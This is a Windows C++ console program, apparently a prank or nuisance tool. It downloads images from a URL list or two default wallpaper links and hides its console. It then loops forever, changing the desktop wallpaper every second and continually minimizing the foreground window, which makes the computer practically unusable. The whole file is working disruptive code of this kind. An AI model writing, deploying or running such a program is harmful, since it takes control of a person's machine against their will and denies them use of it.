// ConsoleApplication1.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "Shlwapi.h"
#include <windows.h>
#include <urlmon.h>
#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <vector>
#include <stdlib.h> 
#include <thread>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Shlwapi.lib")

using namespace std;

string GetValidDrive()
{
	for (char i = 'D'; i <= 'Z'; i++)
	{
		stringstream drvStream;
		drvStream << i << ":\\";
		if (GetDriveTypeA(drvStream.str().c_str()) == 3)
		{
			return drvStream.str();
		}
	}
	return "err";
}

void split(const string &s, char delim, vector<string> &elems) {
	stringstream ss;
	ss.str(s);
	string item;
	while (getline(ss, item, delim)) {
		elems.push_back(item);
	}
}

void DownloadPaths(string &paths, vector<string> &urls, string drive)
{
	for (u_int i = 0; i < urls.size(); i++)
	{
		stringstream fpStrm;
		string fp;
		fpStrm << drive << "img" << i << ".jpg";
		fp = fpStrm.str();
		HRESULT hr = URLDownloadToFileA(NULL, urls[i].c_str(), fp.c_str(), 0, NULL);
		if (PathFileExistsA(fp.c_str()))
		{
			paths += fp + ";";
		}
	}
}

string DetermineDefault() //use default list or txt
{
	fstream urlstxt;
	string paths;
	string urlstr;
	vector<string> dwnldurls;
	vector <string> defaulturls = { "http://wallpapercave.com/wp/2eIg25M.jpg", "http://wallpapercave.com/wp/MaSR3Kd.jpg" };

	urlstxt.open("urls.txt", ios::in);
	if (!urlstxt) {
		DownloadPaths(paths, defaulturls, GetValidDrive());
		return paths;
	}
	urlstxt >> urlstr;
	split(urlstr, ';', dwnldurls);
	urlstxt.close();
	
	DownloadPaths(paths, dwnldurls, GetValidDrive());
	return paths;
}

void ChangeBackground(const string &paths)
{
	u_int i = 0;
	vector<string> vpaths;
	split(paths, ';', vpaths);
	while (true)
	{
		SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)vpaths[i%vpaths.size()].c_str(), SPIF_UPDATEINIFILE);
		i++;
		Sleep(1000);
	}
}

void MinimizeCurrentWindow()
{	
	while (true)
	{
		CloseWindow(GetForegroundWindow());
	}
}

int main()
{
	if (GetValidDrive() == "err")
		return 1;
	string paths = DetermineDefault();
	FreeConsole();
	thread thread1(ChangeBackground,paths);
	thread thread2(MinimizeCurrentWindow);
	thread1.join();
	thread2.join();
	return 0;
}

